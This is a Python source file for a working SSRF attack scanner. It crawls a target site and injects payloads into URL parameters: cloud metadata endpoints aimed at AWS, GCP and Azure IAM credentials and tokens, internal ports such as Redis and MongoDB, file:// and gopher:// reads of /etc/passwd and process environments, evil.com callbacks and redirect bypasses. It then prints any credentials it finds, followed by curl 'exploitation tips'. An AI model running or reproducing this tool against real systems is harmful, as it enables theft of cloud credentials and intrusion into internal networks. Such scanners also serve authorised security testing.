"""
ssrf_scanner.py — Ultra SSRF Scanner
Features: Blind + Semi-blind SSRF, cloud metadata, internal port scan,
          protocol handlers, DNS rebinding hints, OOB detection,
          AWS/GCP/Azure/DigitalOcean metadata extraction
"""

import re
import socket
import time
import threading
from typing import Dict, List, Optional, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

from ui.rich_ui import (
    console, info, warning, error, found, success, section_header, print_summary
)

TIMEOUT = 10
DELAY   = 0.3

# ── Cloud metadata endpoints ──────────────────────────────────────────────────
CLOUD_METADATA = {
    "AWS IMDSv1": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "AWS IMDSv2": [
        "http://169.254.169.254/latest/api/token",
    ],
    "GCP Metadata": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    ],
    "Azure IMDS": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "DigitalOcean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/hostname",
    ],
    "Alibaba Cloud": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    ],
    "Oracle Cloud": [
        "http://169.254.169.254/opc/v1/instance/",
    ],
}

# ── Internal targets ──────────────────────────────────────────────────────────
INTERNAL_TARGETS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://127.1/",
    "http://127.0.1/",
    "http://localhost:80/",
    "http://localhost:443/",
    "http://localhost:8080/",
    "http://localhost:8443/",
    "http://localhost:3000/",
    "http://localhost:6379/",   # Redis
    "http://localhost:27017/",  # MongoDB
    "http://localhost:9200/",   # Elasticsearch
    "http://internal/",
    "http://intranet/",
    "http://admin/",
    "http://backend/",
]

# ── Protocol handlers ──────────────────────────────────────────────────────────
PROTOCOL_PAYLOADS = [
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "file:///proc/self/environ",
    "gopher://localhost:6379/_INFO",
    "gopher://localhost:25/xHELO%20localhost",
    "dict://localhost:11211/stat",
    "sftp://evil.com:11111/",
    "tftp://evil.com:12346/TEST",
    "ldap://localhost:389/%0astats%0aquit",
    "jar:http://evil.com!/",
    "netdoc:///etc/passwd",
]

# ── Common SSRF parameters ─────────────────────────────────────────────────────
SSRF_PARAMS = [
    "url", "uri", "path", "src", "source", "href", "link", "redirect",
    "redirect_url", "redirect_uri", "return", "return_url", "callback",
    "next", "goto", "data", "load", "file", "fetch", "host", "proxy",
    "target", "dest", "destination", "rurl", "request", "image",
    "img", "page", "reference", "site", "resource", "api", "endpoint",
    "webhook", "feed", "download", "import", "export", "continue",
    "window", "domain", "out", "view", "service", "preview",
    "access", "to", "forward", "content", "pdf", "report",
]

# ── Detection signatures ──────────────────────────────────────────────────────
SSRF_SIGNATURES = {
    "AWS": [r"ami-id|instance-id|security-credentials|iam/", r"aws_access_key_id|aws_secret"],
    "GCP": [r"computeMetadata|project-id|service-accounts", r"access_token|token_type"],
    "Azure": [r"compute/|network/|subscriptionId", r"access_token|client_id"],
    "Internal": [r"127\.0\.0\.1|localhost|internal|intranet", r"<title>|Server: "],
    "Redis": [r"redis_version|connected_clients|used_memory"],
    "MongoDB": [r"mongod|MongoDB|WiredTiger"],
    "Elastic": [r"elasticsearch|cluster_name|cluster_uuid"],
}


def _session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    })
    return s


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse(parsed._replace(query=new_query))


def _detect_ssrf(body: str, status: int) -> Optional[str]:
    """Detect SSRF response."""
    for service, patterns in SSRF_SIGNATURES.items():
        for pattern in patterns:
            if re.search(pattern, body, re.I):
                return service
    return None


def _test_ssrf_payload(url: str, param: str, payload: str,
                       extra_headers: Dict = None) -> Optional[Dict]:
    """Test a single SSRF payload."""
    test_url = _inject_param(url, param, payload)
    headers = {"User-Agent": "Mozilla/5.0"}
    if extra_headers:
        headers.update(extra_headers)

    try:
        r = _session().get(test_url, timeout=TIMEOUT, verify=False,
                          headers=headers, allow_redirects=True)
        body   = r.text
        status = r.status_code

        # Check for SSRF indicators
        service = _detect_ssrf(body, status)
        if service:
            return {
                "type":    f"SSRF → {service}",
                "url":     test_url,
                "param":   param,
                "payload": payload,
                "status":  status,
                "service": service,
                "snippet": body[:300],
                "severity":"CRITICAL",
            }

        # Check response size difference (blind SSRF indicator)
        if status == 200 and len(body) > 100:
            # If response contains data that looks like internal content
            if any(re.search(p, body, re.I) for patterns in SSRF_SIGNATURES.values() for p in patterns):
                return {
                    "type":    "SSRF (possible)",
                    "url":     test_url,
                    "param":   param,
                    "payload": payload,
                    "status":  status,
                    "severity":"HIGH",
                }

    except requests.exceptions.ConnectionError:
        pass
    except Exception:
        pass

    return None


def _test_blind_ssrf(url: str, param: str) -> Optional[Dict]:
    """
    Test blind SSRF using timing + error differences.
    Real blind SSRF needs OOB server (interactsh.com etc)
    """
    # Test with non-existent internal host vs external
    internal_payload = "http://192.168.1.1:80/"
    external_payload = "http://nonexistent-xyz-12345.com/"

    try:
        t1 = time.time()
        r1 = _session().get(
            _inject_param(url, param, internal_payload),
            timeout=5, verify=False
        )
        internal_time = time.time() - t1

        t2 = time.time()
        r2 = _session().get(
            _inject_param(url, param, external_payload),
            timeout=5, verify=False
        )
        external_time = time.time() - t2

        # Internal requests timeout faster (network-reachable host)
        # External DNS failures are slower
        if abs(internal_time - external_time) > 1.5:
            return {
                "type":    "Blind SSRF (timing-based)",
                "url":     url,
                "param":   param,
                "payload": internal_payload,
                "timing":  f"internal={internal_time:.1f}s external={external_time:.1f}s",
                "severity":"HIGH",
                "note":    "Use interactsh.com or Burp Collaborator to confirm",
            }
    except Exception:
        pass

    return None


def _check_open_redirect_to_ssrf(url: str, param: str) -> Optional[Dict]:
    """Check if open redirect can be chained to SSRF."""
    redirect_payloads = [
        "http://169.254.169.254",
        "//169.254.169.254",
        "@169.254.169.254",
        "http://evil.com@169.254.169.254",
        "http://169.254.169.254.evil.com",
    ]

    for payload in redirect_payloads:
        test_url = _inject_param(url, param, payload)
        try:
            r = _session().get(test_url, timeout=5, verify=False, allow_redirects=False)
            if r.status_code in (301, 302, 307, 308):
                location = r.headers.get("Location", "")
                if "169.254.169.254" in location or "metadata" in location:
                    return {
                        "type":    "Open Redirect → SSRF",
                        "url":     test_url,
                        "param":   param,
                        "payload": payload,
                        "redirect":location,
                        "severity":"HIGH",
                    }
        except Exception:
            pass

    return None


def _get_urls_with_params(base_url: str) -> List[str]:
    urls = set()
    try:
        r = _session().get(base_url, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            href = urljoin(base_url, a["href"])
            if "?" in href and base_url.split("/")[2] in href:
                urls.add(href)
        # Check forms too
        for form in soup.find_all("form"):
            action = urljoin(base_url, form.get("action",""))
            if action:
                urls.add(action)
    except Exception:
        pass
    return list(urls)


def run_ssrf_scanner(target: str) -> Dict:
    section_header("SSRF Scanner", "Ultra Cloud Metadata + Blind + Protocol Handlers")
    info(f"Target: {target}")

    base_url = target if target.startswith("http") else f"https://{target}"

    # Discover URLs
    info("Discovering parameterized endpoints...")
    urls = [base_url] + _get_urls_with_params(base_url)
    urls_with_params = [u for u in urls if "?" in u]

    # Add SSRF-specific params to all URLs
    all_findings: List[Dict] = []
    lock = threading.Lock()

    # Build test URLs with common SSRF params
    test_cases = []
    for url in urls_with_params[:10]:
        params = list(parse_qs(urlparse(url).query).keys())
        test_cases.extend([(url, p) for p in params])

    # Also test common SSRF params on base URL
    for param in SSRF_PARAMS[:20]:
        test_cases.append((f"{base_url}?{param}=test", param))

    info(f"Testing {len(test_cases)} parameter combinations...")

    for url, param in test_cases[:30]:

        # 1. Cloud metadata tests
        for cloud, endpoints in CLOUD_METADATA.items():
            for endpoint in endpoints[:2]:
                extra = {"Metadata": "true"} if "GCP" in cloud else {}
                result = _test_ssrf_payload(url, param, endpoint, extra)
                if result:
                    result["cloud"] = cloud
                    with lock:
                        all_findings.append(result)
                        found(
                            f"[bold red][SSRF → {cloud}][/bold red]  "
                            f"param={param}"
                        )
                        # Extract sensitive data from snippet
                        snippet = result.get("snippet", "")
                        if "credential" in snippet.lower() or "token" in snippet.lower():
                            console.print(f"  [bold red]⚠ CREDENTIALS IN RESPONSE:[/bold red]")
                            console.print(f"  [red]{snippet[:200]}[/red]")
                    time.sleep(DELAY)

        # 2. Internal service tests
        for internal_url in INTERNAL_TARGETS[:5]:
            result = _test_ssrf_payload(url, param, internal_url)
            if result:
                with lock:
                    all_findings.append(result)
                    found(f"[bold red][SSRF → Internal][/bold red]  {internal_url}")

        # 3. Protocol handlers
        for proto_payload in PROTOCOL_PAYLOADS[:5]:
            result = _test_ssrf_payload(url, param, proto_payload)
            if result:
                with lock:
                    all_findings.append(result)
                    found(f"[bold red][SSRF Protocol][/bold red]  {proto_payload}")

        # 4. Blind SSRF
        blind = _test_blind_ssrf(url, param)
        if blind:
            with lock:
                all_findings.append(blind)
                warning(f"[Blind SSRF] {param}  {blind.get('timing','')}")

        # 5. Open redirect → SSRF
        redirect_ssrf = _check_open_redirect_to_ssrf(url, param)
        if redirect_ssrf:
            with lock:
                all_findings.append(redirect_ssrf)
                found(f"[bold red][Redirect→SSRF][/bold red]  {param}")

    # Print results
    console.print(f"\n[bold cyan]━━━ SSRF FINDINGS ({len(all_findings)}) ━━━[/bold cyan]")
    for f in all_findings:
        color = "bold red" if f["severity"] == "CRITICAL" else "yellow"
        console.print(f"\n  [{color}][{f['type']}][/{color}]")
        console.print(f"  URL:     {f.get('url','')[:80]}")
        console.print(f"  Param:   {f.get('param','')}")
        console.print(f"  Payload: [red]{f.get('payload','')[:60]}[/red]")
        if f.get("snippet"):
            console.print(f"  Data:    [dim]{f['snippet'][:150]}[/dim]")
        if f.get("note"):
            console.print(f"  Note:    [yellow]{f['note']}[/yellow]")

    # Exploitation tips
    console.print("\n[bold yellow]━━━ EXPLOITATION TIPS ━━━[/bold yellow]")
    console.print("  AWS IMDSv1:  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE")
    console.print("  GCP:         curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/")
    console.print("  Azure:       curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01")
    console.print("  OOB Server:  https://app.interactsh.com (for blind SSRF confirmation)")

    print_summary("SSRF Scanner", {
        "Params Tested":   len(test_cases[:30]),
        "Total Found":     len(all_findings),
        "Cloud Metadata":  sum(1 for f in all_findings if "Cloud" in f.get("cloud","") or "AWS" in f["type"] or "GCP" in f["type"] or "Azure" in f["type"]),
        "Internal Access": sum(1 for f in all_findings if "Internal" in f["type"]),
        "Blind SSRF":      sum(1 for f in all_findings if "Blind" in f["type"]),
        "Protocol Abuse":  sum(1 for f in all_findings if "Protocol" in f["type"]),
    })

    return {"findings": all_findings, "total": len(all_findings)}
